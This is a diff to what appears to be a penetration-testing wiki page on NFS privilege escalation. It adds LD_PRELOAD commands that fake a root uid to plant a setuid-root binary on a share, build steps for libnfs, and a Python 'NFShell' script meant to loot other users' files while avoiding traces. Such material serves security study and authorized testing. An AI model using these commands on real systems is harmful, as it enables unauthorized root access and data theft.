@@ -46,7 +46,10 @@ cd <SHAREDD_FOLDER>
 ### Local Exploit
 
 {% hint style="info" %}
-Note that if you can create a tunnel from your machine to the victim machine you can still use the Remote version to exploit this privilege escalation tunnelling the required ports.
+Note that if you can create a **tunnel from your machine to the victim machine you can still use the Remote version to exploit this privilege escalation tunnelling the required ports**.  
+The following trick is in case the file `/etc/exports` **indicates an IP**. In this case you **won't be able to use** in any case the **remote exploit** and you will need to **abuse this trick**.  
+Another required requirement for the exploit to work is that **the export inside `/etc/export`** **must be using the `insecure` flag**.  
+--_I'm not sure that if `/etc/export` is indicating an IP address this trick will work_--
 {% endhint %}
 
 **Trick copied from** [**https://www.errno.fr/nfs\_privesc.html**](https://www.errno.fr/nfs_privesc.html)\*\*\*\*
@@ -69,10 +72,13 @@ Here’s a [library that lets you do just that](https://github.com/sahlberg/libn
 
 #### Compiling the example <a id="compiling-the-example"></a>
 
-Depending on your kernel, you might need to adapt the example. In my case I had to comment out the fallocate syscall. Due to the absence of cmake on the system, I also needed to link against the precompiled library which can be [found here](https://sites.google.com/site/libnfstarballs/li).
+Depending on your kernel, you might need to adapt the example. In my case I had to comment out the fallocate syscalls.
 
 ```bash
-gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L../libnfs-1.11.0/lib/.libs/
+./bootstrap
+./configure
+make
+gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
 ```
 
 #### Exploiting using the library <a id="exploiting-using-the-library"></a>
@@ -88,10 +94,10 @@ gcc pwn.c -o a.out
 Place our exploit on the share and make it suid root by faking our uid in the RPC calls:
 
 ```text
-LD_NFS_UID=0 LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
-LD_NFS_UID=0 LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
-LD_NFS_UID=0 LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
-LD_NFS_UID=0 LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
 ```
 
 All that’s left is to launch it:
@@ -102,4 +108,40 @@ All that’s left is to launch it:
 ```
 
 There we are, local root privilege escalation!
+
+### Bonus NFShell <a id="bonus-nfshell"></a>
+
+Once local root on the machine, I wanted to loot the NFS share for possible secrets that would let me pivot. But there were many users of the share all with their own uids that I couldn’t read despite being root because of the uid mismatch. I didn’t want to leave obvious traces such as a chown -R, so I rolled a little snippet to set my uid prior to running the desired shell command:
+
+```python
+#!/usr/bin/env python
+import sys
+import os
+
+def get_file_uid(filepath):
+    try:
+        uid = os.stat(filepath).st_uid
+    except OSError as e:
+        return get_file_uid(os.path.dirname(filepath))
+    return uid
+
+filepath = sys.argv[-1]
+uid = get_file_uid(filepath)
+os.setreuid(uid, uid)
+os.system(' '.join(sys.argv[1:]))
+```
+
+You can then run most commands as you normally would by prefixing them with the script:
+
+```text
+[root@machine .tmp]# ll ./mount/
+drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
+[root@machine .tmp]# ls -la ./mount/9.3_old/
+ls: cannot open directory ./mount/9.3_old/: Permission denied
+[root@machine .tmp]# ./nfsh.py ls --color -l ./mount/9.3_old/
+drwxr-x---  2 1008 1009 1024 Apr  5  2017 bin
+drwxr-x---  4 1008 1009 1024 Apr  5  2017 conf
+drwx------ 15 1008 1009 1024 Apr  5  2017 data
+drwxr-x---  2 1008 1009 1024 Apr  5  2017 install
+```
 
